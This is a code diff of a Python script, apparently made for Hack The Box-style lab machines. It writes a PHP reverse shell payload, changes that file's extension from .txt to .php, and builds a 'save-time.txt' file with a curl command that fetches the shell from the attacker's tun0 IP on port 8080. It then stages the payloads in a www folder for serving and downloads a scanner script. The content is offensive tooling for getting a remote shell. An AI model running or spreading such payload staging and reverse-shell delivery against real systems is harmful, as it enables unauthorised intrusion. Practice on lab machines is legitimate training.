@@ -30,7 +30,7 @@ shell_txt.close()
 cmd('echo " " >> shell.txt') # to avoid that '#' char in last part of code
 
 # php rev shell
-rev_txt = open('php-rev-shell.txt','w')
+rev_txt = open('php-rev-shell.php','w')
 rev_txt.write('''<?php
 set_time_limit (0);
 $VERSION = "1.0";
@@ -147,7 +147,7 @@ cmd('curl https://raw.githubusercontent.com/jopraveen/htbscan/main/htbs.py -o ht
 # save time.txt
 save_time_txt = open('save-time.txt','w')
 save_time_txt.write('''
-curl http://'''+tun0_IP+''':8080/php-rev-shell.txt'''
+curl http://'''+tun0_IP+''':8080/php-rev-shell.php'''
 +'''
 
 '''+
@@ -164,7 +164,7 @@ save_time_txt.close()
 
 # removing unwanted files and arranging payloads in a folder
 cmd('rm ip.txt ping.txt cmd.txt')
-cmd('mkdir www && mv save-time.txt php-rev-shell.txt shell.txt www/')
+cmd('mkdir www && mv save-time.txt php-rev-shell.php shell.txt www/')
 
 # opening IP in web browser
 webbrowser.open_new("http://"+MACHINE_IP)
